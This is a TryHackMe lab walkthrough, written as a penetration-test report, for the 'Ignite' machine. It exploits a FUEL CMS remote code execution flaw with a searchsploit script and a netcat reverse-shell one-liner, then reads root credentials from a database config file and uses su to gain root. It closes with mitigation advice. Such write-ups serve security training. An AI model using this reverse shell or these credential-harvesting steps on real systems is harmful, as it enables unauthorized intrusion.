# 🟩Ignite – Try Hack Me (THM) Walkthrough Report  

**Prepared by:** Nishanth Antony  
**Date:** September 1, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

-----

## **1. Executive Summary**

This report outlines the steps taken to compromise the `Ignite` machine. The assessment successfully identified and exploited a known **Remote Code Execution (RCE)** vulnerability in the **FUEL CMS** platform. Initial access was gained as the `www-data` user, and privilege escalation to the `root` user was achieved by leveraging credentials found in a database configuration file. The full system compromise highlights critical misconfigurations related to vulnerable software and insecure credential management.

-----

## **2. Methodology**

The assessment followed a methodical approach to penetration testing:

1.  **Reconnaissance:** Enumeration of open ports, services, and web server information.
2.  **Initial Foothold:** Exploitation of a known vulnerability to gain a low-privileged shell.
3.  **Privilege Escalation:** Post-exploitation enumeration to find a path to the `root` user.
4.  **Reporting:** Documentation of all findings, including the commands used and their outputs.

-----

## **3. Findings and Exploitation**

### **3.1 Reconnaissance: Identifying Vulnerable Software**

The initial step was to perform a network scan to identify the running services and their versions.

**Command & Output:**

```bash
# Nmap 7.80 scan initiated Sun Jun 14 20:38:52 2020 as: nmap -sC -sV -T4 -A -oN ignite.nmap <target_ip>
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
...
|_http-title: Welcome to FUEL CMS
```

**Findings:** The Nmap scan revealed that port 80 was running a web server hosting **FUEL CMS**. The `robots.txt` file also provided a key piece of information, indicating the `/fuel/` directory.

### **3.2 Initial Access: Remote Code Execution (RCE)**

A search for known vulnerabilities for "FUEL CMS" using `searchsploit` immediately returned a result for a **Remote Code Execution (RCE)** vulnerability.

**Commands & Outputs:**

```bash
┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~]
╰─$ searchsploit fuel cms
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
fuelCMS 1.4.1 - Remote Code Execution                                                                                               | linux/webapps/47138.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
...
┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~]
╰─$ searchsploit -m linux/webapps/47138.py
...
Copied to: /twseptian/47138.py
```

The Python exploit script `47138.py` was downloaded. I used this script in conjunction with `Burp Suite` to inject a reverse shell payload.

**Commands & Outputs:**

  * **Netcat Listener:**

    ```bash
    ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~]
    ╰─$ nc -lvnp 4444
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::4444
    Ncat: Listening on 0.0.0.0:4444
    ```

  * **RCE Exploit Payload:** I used the following reverse shell command as the payload for the Python script:

    ```
    rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc <your_ip_address> 4444 >/tmp/f
    ```

  * **Reverse Shell Connection:**

    ```
    Ncat: Connection from <target_ip>.
    Ncat: Connection from <target_ip>:47538.
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ whoami
    www-data
    ```

**Result:** A low-privileged shell was obtained as the **`www-data`** user.

### **3.3 Privilege Escalation to `root`**

From the `www-data` shell, I began enumerating the file system to find a way to escalate privileges. The first goal was to find the user flag, which was located in `/home/www-data/flag.txt`.

**Commands & Outputs:**

```bash
www-data@ubuntu:/var/www/html$ cd /home/www-data
www-data@ubuntu:/home/www-data$ ls -la
...
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
<redacted_flag>
```

To escalate to `root`, I investigated the web application's configuration files. I found a database configuration file, `database.php`, in the `fuel/application/config/` directory.

**Commands & Outputs:**

```bash
www-data@ubuntu:/var/www/html$ cat fuel/application/config/database.php
...
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
...
```

**Vulnerability:** The database configuration file contained plaintext credentials for the `root` user on the local system. This is a severe security misconfiguration.

**Exploitation:** The credentials `root:mememe` were used with the `su` command to switch to the `root` user.

**Commands & Outputs:**

```bash
www-data@ubuntu:/var/www/html$ su - root
su - root
Password: mememe
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# whoami
whoami
root
root@ubuntu:~# cd /root
root@ubuntu:~# ls -l
total 4
-rw-r--r-- 1 root root 34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
<redacted_flag>
```

**Result:** Full system compromise was achieved by leveraging the leaked `root` credentials.

-----

## **4. Mitigation Recommendations**

  * **Vulnerability Management:** The web server is running a version of **FUEL CMS (1.4.1)** that is known to be vulnerable to **RCE (CVE-2018-16763)**. The application should be immediately updated to a secure, patched version.
  * **Secure Credential Storage:** **Sensitive credentials, especially for the `root` user, should never be stored in plaintext within a web application's configuration files.** The database should use a separate, non-privileged user account.
  * **Principle of Least Privilege:** The web server process (`www-data`) should not have permissions to read files in the `/home/` directory or other sensitive locations. Permissions should be restricted to only what is necessary.
  * **Filesystem Security:** The `www-data` user's home directory should not be accessible to the `root` user in a way that allows a user to access flags, or any files with sensitive data.
